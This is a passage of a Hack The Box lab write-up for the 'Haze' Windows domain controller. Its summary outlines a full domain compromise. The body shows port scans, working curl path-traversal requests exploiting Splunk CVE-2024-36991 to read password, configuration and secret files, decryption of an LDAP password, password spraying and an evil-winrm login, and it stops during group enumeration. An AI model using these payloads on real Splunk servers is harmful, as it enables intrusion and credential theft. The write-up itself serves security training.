---
title: "HTB Haze Write-up"
name: Haze
date: 2025-06-29
difficulty: Hard
os: Windows
skills: "Enumeration, Path Traversal, Username Enumeration, Password Spraying, Kerberos, ACE Abuse, ADCS Shadow Credentials, Privilege Escalation, GMSA Password Read, Pass-the-Hash, Credential Hunting, Reverse Shell" 
tools: "rustscan, nmap, CVE-2024-36991, splunksecrets, python, username-anarchy, nxc, evil-winrm, SharpHound, BloodHound, ncat, klist, PowerView, impacket-owneredit, impacket-dacledit, pth-net, pywhisker, PKINITtools, revshells, PrintSpoofer, mimikatz, impacket-secretsdump" 
published: true
---

![](images/Pasted%20image%2020250623154807.png)

## Summary

The Haze machine was compromised by exploiting a chain of vulnerabilities, starting with a Splunk path traversal (CVE-2024-36991), which allowed the retrieval of sensitive files and revealed an LDAP bind password for `paul.taylor`. 

This granted initial access to the Active Directory environment. Using the `Haze-IT-Backup$` gMSA account's misconfigured ADCS permissions, a certificate was generated for `edward.martin` via `pywhisker`, enabling a Kerberos TGT request with `PKINITtools` to obtain Edward’s NTLM hash. 

This hash provided access to the `user.txt` flag and a Splunk backup file containing an encrypted `alexander.green` password, decrypted using `splunksecrets`. 

Logging into Splunk as `admin` with these credentials enabled the upload of a malicious app (`revshell.tgz`), resulting in a reverse shell as `alexander.green`. 

Leveraging Alexander’s `SeImpersonatePrivilege`, `PrintSpoofer` escalated to `DC01$`, which had `DCSync` rights. 
Finally, `mimikatz` dumped the Administrator’s NTLM hash, granting full domain compromise and access to the `root.txt` flag.

## mark.adams
### Recon

#### Port scan

Recon began with a port scan using `rustscan` and `nmap`.
A port scan with `rustscan` and `nmap` revealed:
- Active Directory services on ports `53` (DNS), `88` (Kerberos), `389/636` (LDAP), `445` (SMB), and `5985` (WinRM).
- Splunkd running on ports `8000`, `8088`, and `8089`.
- Certificates issued by `dc01.haze.htb` CA.
```
fcoomans@kali:~/htb/haze$ rustscan -a 10.10.11.61 --tries 5 --ulimit 10000 -- -sCV -oA haze_tcp_all
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports: The virtual equivalent of knocking on doors.

[~] The config file is expected to be at "/home/fcoomans/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
<SNIP>
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV -oA haze_tcp_all" on ip 10.10.11.61
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 15:53 SAST
<SNIP>
Initiating SYN Stealth Scan at 15:53
Scanning 10.10.11.61 [30 ports]
Discovered open port 53/tcp on 10.10.11.61
Discovered open port 135/tcp on 10.10.11.61
Discovered open port 445/tcp on 10.10.11.61
Discovered open port 139/tcp on 10.10.11.61
Discovered open port 56149/tcp on 10.10.11.61
Discovered open port 593/tcp on 10.10.11.61
Discovered open port 389/tcp on 10.10.11.61
Discovered open port 88/tcp on 10.10.11.61
Discovered open port 9389/tcp on 10.10.11.61
Discovered open port 56135/tcp on 10.10.11.61
Discovered open port 49666/tcp on 10.10.11.61
Discovered open port 47001/tcp on 10.10.11.61
Discovered open port 56183/tcp on 10.10.11.61
Discovered open port 49669/tcp on 10.10.11.61
Discovered open port 636/tcp on 10.10.11.61
Discovered open port 56136/tcp on 10.10.11.61
Discovered open port 49665/tcp on 10.10.11.61
Discovered open port 49664/tcp on 10.10.11.61
Discovered open port 8089/tcp on 10.10.11.61
Discovered open port 56243/tcp on 10.10.11.61
Discovered open port 8088/tcp on 10.10.11.61
Discovered open port 3268/tcp on 10.10.11.61
Discovered open port 56166/tcp on 10.10.11.61
Discovered open port 8000/tcp on 10.10.11.61
Discovered open port 56152/tcp on 10.10.11.61
Discovered open port 464/tcp on 10.10.11.61
Discovered open port 3269/tcp on 10.10.11.61
Discovered open port 59022/tcp on 10.10.11.61
Discovered open port 5985/tcp on 10.10.11.61
Discovered open port 49667/tcp on 10.10.11.61
Completed SYN Stealth Scan at 15:53, 0.39s elapsed (30 total ports)
Initiating Service scan at 15:53
Scanning 30 services on 10.10.11.61
Service scan Timing: About 53.33% done; ETC: 15:55 (0:00:32 remaining)
Completed Service scan at 15:55, 63.36s elapsed (30 services on 1 host)
NSE: Script scanning 10.10.11.61.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:55
Completed NSE at 15:55, 13.01s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:55
Completed NSE at 15:55, 2.99s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:55
Completed NSE at 15:55, 0.00s elapsed
Nmap scan report for 10.10.11.61
Host is up, received reset ttl 127 (0.18s latency).
Scanned at 2025-06-23 15:53:58 SAST for 80s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-23 21:54:07Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Issuer: commonName=haze-DC01-CA/domainComponent=haze
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
| -----BEGIN CERTIFICATE-----
| MIIFxzCCBK+gAwIBAgITaQAAAAKwulKDkCsWNAAAAAAAAjANBgkqhkiG9w0BAQsF
<SNIP>
| kE3gssbluZx+QYPdAE4pV1k5tbg/kLvBePIXVKspHDd+4Wg0w+/6ivkuhQ==
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Issuer: commonName=haze-DC01-CA/domainComponent=haze
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
| -----BEGIN CERTIFICATE-----
| MIIFxzCCBK+gAwIBAgITaQAAAAKwulKDkCsWNAAAAAAAAjANBgkqhkiG9w0BAQsF
<SNIP>
| kE3gssbluZx+QYPdAE4pV1k5tbg/kLvBePIXVKspHDd+4Wg0w+/6ivkuhQ==
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Issuer: commonName=haze-DC01-CA/domainComponent=haze
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
| -----BEGIN CERTIFICATE-----
| MIIFxzCCBK+gAwIBAgITaQAAAAKwulKDkCsWNAAAAAAAAjANBgkqhkiG9w0BAQsF
<SNIP>
| kE3gssbluZx+QYPdAE4pV1k5tbg/kLvBePIXVKspHDd+4Wg0w+/6ivkuhQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Issuer: commonName=haze-DC01-CA/domainComponent=haze
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
| -----BEGIN CERTIFICATE-----
| MIIFxzCCBK+gAwIBAgITaQAAAAKwulKDkCsWNAAAAAAAAjANBgkqhkiG9w0BAQsF
<SNIP>
| kE3gssbluZx+QYPdAE4pV1k5tbg/kLvBePIXVKspHDd+4Wg0w+/6ivkuhQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp  open  http          syn-ack ttl 127 Splunkd httpd
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.10.11.61:8000/en-US/account/login?return_to=%2Fen-US%2F
| http-robots.txt: 1 disallowed entry
|_/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Splunkd
|_http-favicon: Unknown favicon MD5: E60C968E8FF3CC2F4FB869588E83AFC6
8088/tcp  open  ssl/http      syn-ack ttl 127 Splunkd httpd
| http-methods:
|_  Supported Methods: GET POST HEAD OPTIONS
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Splunkd
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/emailAddress=support@splunk.com/localityName=San Francisco
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:29:08
| Not valid after:  2028-03-04T07:29:08
| MD5:   82e5:ba5a:c723:2f49:6f67:395b:5e64:ed9b
| SHA-1: e859:76a6:03da:feef:c1ab:9acf:ecc7:fd75:f1e5:1ab2
| -----BEGIN CERTIFICATE-----
| MIIDMjCCAhoCCQCtNoIdTvT1CjANBgkqhkiG9w0BAQsFADB/MQswCQYDVQQGEwJV
<SNIP>
| 3EhgaH2L
|_-----END CERTIFICATE-----
8089/tcp  open  ssl/http      syn-ack ttl 127 Splunkd httpd
|_http-server-header: Splunkd
| http-robots.txt: 1 disallowed entry
|_/
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/emailAddress=support@splunk.com/localityName=San Francisco
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:29:08
| Not valid after:  2028-03-04T07:29:08
| MD5:   82e5:ba5a:c723:2f49:6f67:395b:5e64:ed9b
| SHA-1: e859:76a6:03da:feef:c1ab:9acf:ecc7:fd75:f1e5:1ab2
| -----BEGIN CERTIFICATE-----
| MIIDMjCCAhoCCQCtNoIdTvT1CjANBgkqhkiG9w0BAQsFADB/MQswCQYDVQQGEwJV
<SNIP>
| 3EhgaH2L
|_-----END CERTIFICATE-----
|_http-title: splunkd
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56135/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
56136/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56149/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56166/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56183/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56243/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
59022/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
<SNIP>
```

A simple UDP port scan was then run.  This revealed that port `123/udp` can be used to sync time with the server.  This is important as Kerberos is time-sensitive and needs the attack host time to be in sync with the target for Kerberos ticket requests.
```
fcoomans@kali:~/htb/haze$ nmap --top-ports 100 --open -sU 10.10.11.61
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 23:17 SAST
Nmap scan report for dc01.haze.htb (10.10.11.61)
Host is up (0.17s latency).
Not shown: 84 closed udp ports (port-unreach)
PORT      STATE         SERVICE
53/udp    open          domain
69/udp    open|filtered tftp
80/udp    open|filtered http
88/udp    open          kerberos-sec
123/udp   open          ntp
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
500/udp   open|filtered isakmp
1900/udp  open|filtered upnp
3456/udp  open|filtered IISrpc-or-vat
4500/udp  open|filtered nat-t-ike
5353/udp  open|filtered zeroconf
9200/udp  open|filtered wap-wsp
10000/udp open|filtered ndmp
32768/udp open|filtered omad
49201/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 93.94 seconds
```

I added `dc01` and `dc01.haze.htb` to `/etc/hosts`.  The target can now be accessed by using the name.
```
fcoomans@kali:~/htb/haze$ grep haze /etc/hosts
10.10.11.61     dc01.haze.htb dc01
```

#### Splunk

##### Build 9.2.1

https://dc01.haze.htb:8089 was opened and revealed that the server is running Splunk build 9.2.1.

![](images/Pasted%20image%2020250628081649.png)

##### CVE-2024-36991

A quick Google search shows that this version is vulnerable to a path traversal attack (CVE-2024-36991): https://nvd.nist.gov/vuln/detail/cve-2024-36991

And this gives an example of how to test the path traversal: https://github.com/Mr-xn/CVE-2024-36991
This is tested by reading `C:\Windows\win.ini`.
```
fcoomans@kali:~/htb/haze$ curl --path-as-is "http://dc01.haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../Windows/win.ini"
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

##### Interesting files

I read the Splunk documentation and found some interesting file paths that might be valid for this attack:
- `/etc/passwd` - is Splunk's internal password database.
- `/etc/auth/splunk.secret` - the secret that is used to encrypt passwords to `$1$` and `$7$`.  This looked like hashes, but they were not and could actually be decrypted.
- `/etc/system/local/authentication.conf` - what authentication type Splunk is using.

Things to note:
- `$1$` and `$7$` encrypted passwords can be decrypted using `splunksecrets` (https://github.com/HurricaneLabs/splunksecrets) and the `/etc/auth/splunk.secret`. 
- `/etc/passwd` might contain `$6$` (sha512crypt) password hashes.
- `/etc/system/local/authentication.conf` shows what authentication type is used.  Is Splunk using the internal Splunk password database (`/etc/passwd`), LDAP, Scripted, SAML or ProxySSO?

### Exploitation

#### Path Traversal

With this knowledge in hand, I retrieve the content of the 3 files.

The built-in Splunk password database reveals 4 users and their sha512crypt hashes.
`hashcat` was unable to crack any of the password hashes.
The file is potentially still important as it shows 3 usernames with the e-mail address `@haze.htb`.
```
fcoomans@kali:~/htb/haze$ curl -s "http://dc01.haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/Splunk/etc/passwd"
:admin:$6$Ak3m7.aHgb/NOQez$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1::Administrator:admin:changeme@example.com:::20152
:edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152
:mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152
:paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152
```

The authentication configuration file shows that LDAP is used and not the built-in Splunk password database.
It also reveals a `$7$` encrypted password for user `Paul Taylor`.  I need to get `splunk.secrets` and `splunksecrets` to decrypt this encrypted password.
```
fcoomans@kali:~/htb/haze$ curl -s "http://dc01.haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/Splunk/etc/system/local/authentication.conf"
[splunk_auth]
minPasswordLength = 8
minPasswordUppercase = 0
minPasswordLowercase = 0
minPasswordSpecial = 0
minPasswordDigit = 0

[Haze LDAP Auth]
SSLEnabled = 0
anonymous_referrals = 1
bindDN = CN=Paul Taylor,CN=Users,DC=haze,DC=htb
bindDNpassword = $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=
charset = utf8
emailAttribute = mail
enableRangeRetrieval = 0
groupBaseDN = CN=Splunk_LDAP_Auth,CN=Users,DC=haze,DC=htb
groupMappingAttribute = dn
groupMemberAttribute = member
groupNameAttribute = cn
host = dc01.haze.htb
nestedGroups = 0
network_timeout = 20
pagelimit = -1
port = 389
realNameAttribute = cn
sizelimit = 1000
timelimit = 15
userBaseDN = CN=Users,DC=haze,DC=htb
userNameAttribute = samaccountname

[authentication]
authSettings = Haze LDAP Auth
authType = LDAP
```

![](images/Pasted%20image%2020250628085130.png)

The `splunk.secrets` file is saved to a local file.
```
fcoomans@kali:~/htb/haze$ curl -s "http://dc01.haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/Splunk/etc/auth/splunk.secret"
NfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD
fcoomans@kali:~/htb/haze$ curl -s "http://dc01.haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/Splunk/etc/auth/splunk.secret" >loot/splunk.secret
```

#### splunksecrets

`splunksecrets` can be installed using `pip`, according to the GitHub repo page (https://github.com/HurricaneLabs/splunksecrets.git).

![](images/Pasted%20image%2020250628084625.png)

A `splunksecrets` Python virtual environment was created and activated.  `splunksecrets` was then installed using `pip`.
```
fcoomans@kali:~/htb/haze$ python -m venv splunksecrets

fcoomans@kali:~/htb/haze$ . ./splunksecrets/bin/activate

(splunksecrets)fcoomans@kali:~/htb/haze$ pip install splunksecrets
Collecting splunksecrets
  Using cached splunksecrets-1.1.0-py3-none-any.whl.metadata (303 bytes)
<SNIP>
Installing collected packages: pcrypt, pycparser, click, cffi, cryptography, splunksecrets
Successfully installed cffi-1.17.1 click-8.2.1 cryptography-45.0.4 pcrypt-1.0.5 pycparser-2.22 splunksecrets-1.1.0
```

`splunksecrets` and the `loot/splunk.secrets` file was used to decrypt the LDAP password and the virtual environment was deactivated.
The decrypted password is `Ld@p_Auth_Sp1unk@2k24`.
```
(splunksecrets)fcoomans@kali:~/htb/haze$ splunksecrets splunk-decrypt -S loot/splunk.secret --ciphertext '$7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY='
Ld@p_Auth_Sp1unk@2k24

(splunksecrets)fcoomans@kali:~/htb/haze$ deactivate
```

![](images/Pasted%20image%2020250628085326.png)

#### username-anarchy

The password was tested against the LDAP service on DC01 using `nxc` and it fails:
```
fcoomans@kali:~/htb/haze$ nxc ldap dc01.haze.htb -u "Paul Taylor" -p Ld@p_Auth_Sp1unk@2k24
LDAP        10.10.11.61     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
LDAP        10.10.11.61     389    DC01             [-] haze.htb\Paul Taylor:Ld@p_Auth_Sp1unk@2k24
```

But did it fail because the password was wrong or the username?
The `username-anarchy` repo was cloned from https://github.com/urbanadventurer/username-anarchy.
```
fcoomans@kali:~/htb/haze$ git clone https://github.com/urbanadventurer/username-anarchy.git
Cloning into 'username-anarchy'...
remote: Enumerating objects: 448, done.
remote: Counting objects: 100% (62/62), done.
remote: Compressing objects: 100% (49/49), done.
remote: Total 448 (delta 29), reused 32 (delta 9), pack-reused 386 (from 1)
Receiving objects: 100% (448/448), 16.79 MiB | 9.04 MiB/s, done.
Resolving deltas: 100% (156/156), done.
```

`username-anarchy` was used to create the file `paul.txt`, which contains all possible username combinations for user `paul taylor`.
```
fcoomans@kali:~/htb/haze$ username-anarchy/username-anarchy paul taylor >paul.txt

fcoomans@kali:~/htb/haze$ head paul.txt
paul
paultaylor
paul.taylor
paultayl
pault
p.taylor
ptaylor
tpaul
t.paul
taylorp
```

`nxc` was run again but this time using the generate usernames and found that the correct credentials are `haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24`.
```
fcoomans@kali:~/htb/haze$ nxc ldap dc01.haze.htb -u paul.txt -p Ld@p_Auth_Sp1unk@2k24
LDAP        10.10.11.61     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
LDAP        10.10.11.61     389    DC01             [-] haze.htb\paul:Ld@p_Auth_Sp1unk@2k24
LDAP        10.10.11.61     389    DC01             [-] haze.htb\paultaylor:Ld@p_Auth_Sp1unk@2k24
LDAP        10.10.11.61     389    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24
```

![](images/Pasted%20image%2020250628090331.png)

#### mark.adams

`nxc` was then used to get the Active Directory (AD) groups.  Only a handful of groups were shown.
At this point it looked like Paul had limited rights to read AD groups and membership.
One interesting group was shown however: `Remote Management Users`.
```
fcoomans@kali:~/htb/haze$ nxc ldap dc01.haze.htb -u "paul.taylor" -p 'Ld@p_Auth_Sp1unk@2k24' --groups |grep -v "membercount: 0"
LDAP                     10.10.11.61     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
LDAP                     10.10.11.61     389    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24
LDAP                     10.10.11.61     389    DC01             Administrators                           membercount: 3
LDAP                     10.10.11.61     389    DC01             Users                                    membercount: 3
LDAP                     10.10.11.61     389    DC01             Guests                                   membercount: 2
LDAP                     10.10.11.61     389    DC01             IIS_IUSRS                                membercount: 1
LDAP                     10.10.11.61     389    DC01             Certificate Service DCOM Access          membercount: 1
LDAP                     10.10.11.61     389    DC01             Remote Management Users                  membercount: 2
LDAP                     10.10.11.61     389    DC01             Pre-Windows 2000 Compatible Access       membercount: 2
LDAP                     10.10.11.61     389    DC01             Windows Authorization Access Group       membercount: 1
```

`nxc` displayed the group members for `Remote Management Users`.
```
fcoomans@kali:~/htb/haze$ nxc ldap dc01.haze.htb -u "paul.taylor" -p 'Ld@p_Auth_Sp1unk@2k24' --groups "Remote Management Users"
LDAP        10.10.11.61     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
LDAP        10.10.11.61     389    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24
LDAP        10.10.11.61     389    DC01             Edward Martin
LDAP        10.10.11.61     389    DC01             Mark Adams
```

The username format is `name.surname`.  The two users were added to the `users.txt` file and a password spray was performed using `paul.taylor`'s password.
The password is reused for user `mark.adams`.
```
fcoomans@kali:~/htb/haze$ cat users.txt
edward.martin
mark.adams

fcoomans@kali:~/htb/haze$ nxc ldap dc01.haze.htb -u users.txt -p 'Ld@p_Auth_Sp1unk@2k24'
LDAP        10.10.11.61     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
LDAP        10.10.11.61     389    DC01             [-] haze.htb\edward.martin:Ld@p_Auth_Sp1unk@2k24
LDAP        10.10.11.61     389    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24
```

![](images/Pasted%20image%2020250628091158.png)

`evil-winrm` was used with `mark.adams`'s credentials to gain a foothold on the target.
```
fcoomans@kali:~/htb/haze$ evil-winrm -i dc01.haze.htb -u mark.adams -p Ld@p_Auth_Sp1unk@2k24

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mark.adams\Documents> whoami
haze\mark.adams
*Evil-WinRM* PS C:\Users\mark.adams\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.10.11.61
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 10.10.10.2
```

### Post Exploitation

Mark doesn't have any special privileges, but is a member of the `gMSA_Managers` group.
```
*Evil-WinRM* PS C:\Users\mark.adams\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\mark.adams\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                         Attributes
=========================================== ================ =========================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
HAZE\gMSA_Managers                          Group            S-1-5-21-323145914-28650650-2368316563-1107 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

`mark.adams` also isn't the holder of the `user.txt` flag.
```
*Evil-WinRM* PS C:\Users\mark.adams\Documents> tree C:\Users\mark.adams /a /f
Folder PATH listing
Volume serial number is 00000185 3985:943C
C:\USERS\MARK.ADAMS
+---Desktop
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
\---Videos
```

## edward.martin

### Recon

#### AD Groups

AD groups were checked again using `nxc`, but this time as user `mark.adams`.
**Key Findings**:
- `gMSA_Managers`: Includes `mark.adams`.
- `Splunk_Admins`: Includes `alexander.green`.
- `Backup_Reviewers`: Includes `edward.martin`.
```
fcoomans@kali:~/htb/haze$ nxc ldap dc01.haze.htb -u "mark.adams" -p 'Ld@p_Auth_Sp1unk@2k24' --groups |grep -v "membercount: 0"
LDAP                     10.10.11.61     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
LDAP                     10.10.11.61     389    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24
LDAP                     10.10.11.61     389    DC01             Administrators                           membercount: 3
